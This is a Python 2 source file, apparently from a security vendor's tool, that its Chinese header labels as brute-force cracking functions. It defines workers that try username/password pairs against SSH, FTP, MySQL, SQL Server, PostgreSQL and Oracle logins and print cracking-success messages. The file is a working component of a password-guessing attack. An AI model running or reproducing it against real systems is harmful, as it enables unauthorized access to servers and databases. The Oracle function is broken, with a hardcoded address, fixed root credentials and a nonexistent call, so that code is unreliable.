# -*- coding: utf-8 -*-

"""
 * Copyright(C) Anyuntec 2017.
 *
 * 暴力破解函数体
 *
 * @author margin 2017/02/20.
 *
 * @version V1.00.
 *
 * 更新履历： V1.00 2017/02/20 margin 创建.
 *
 """
import paramiko
from ftplib import FTP
import MySQLdb
import pymssql,psycopg2
import cx_Oracle

def sshWorker(host,username,password):
    """
    ssh连接
    :param host:
    :param username:
    :param password:
    :return:
    """
    ssh=paramiko.SSHClient()
    try:
        #print "正在破解SSH【%s】【%s】【%s】" % (host,username,password)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host,username=username,password=password,timeout=1)
        return True
    except:
        #print traceback.format_exc()
        # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
        return False
    finally:
        ssh.close()

def ftpWorker(host,username,password,port=21):
    """
    ftp连接
    :param host:
    :param username:
    :param password:
    :return:
    """
    ftp = FTP(host)
    try:
        print "正在破解FTP【%s】【%s】【%s】" % (host,username,password)
        ftp.connect(host,port)  #连接 服务器名  端口号
        ftp.login(username,password)
        print "FTP破解成功"
        return True
    except:
        #print traceback.format_exc()
        # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
        return False
    finally:
        ftp.quit()

def mysqlWorker(host,username,password,port=3306):
    """
    mysql连接
    :param host:
    :param username:
    :param password:
    :return:
    """
    try:
        print "正在破解MySQL【%s】【%s】【%s】" % (host,username,password)
        db = MySQLdb.connect(host=host, user=username, passwd=password, db="mysql", port=port)
        db.close()
        print "MySQL破解成功"
        return True
    except:
        #print traceback.format_exc()
        # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
        return False

def mssqlWorker(host,username,password,port=1433):
    """
    mssql连接
    :param host:
    :param username:
    :param password:
    :return:
    """
    try:
        print "正在破解SQLServer【%s】【%s】【%s】" % (host,username,password)
        db = pymssql.connect(server=host, port=port, user=username, password=password)
        db.close()
        print "SQLServer破解成功"
        return True
    except:
        #print traceback.format_exc()
        # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
        return False

def postgresqlWorker(host,username,password,port=5432):
    """
    postgresql连接
    :param host:
    :param username:
    :param password:
    :return:
    """
    try:
        print "正在破解Postgresql【%s】【%s】【%s】" % (host,username,password)
        db = psycopg2.connect(database="postgres", user=username, password=password, host=host, port=port)
        db.close()
        print "Postgresql破解成功"
        return True
    except:
        #print traceback.format_exc()
        # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
        return False

def oracleWorker(host,username,password,port=1521):
    """
    Oracle连接
    :param host:
    :param username:
    :param password:
    :return:
    """
    try:
        print "正在破解Oracle【%s】【%s】【%s】" % (host,username,password)
        dsn = cx_Oracle.makedsn("192.168.1.1", "1521", "orcl")
        con = cx_Oracle.cx_Oracle("root", "root", dsn)
        print "Oracle破解成功"
        return True
    except:
        #print traceback.format_exc()
        # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
        return False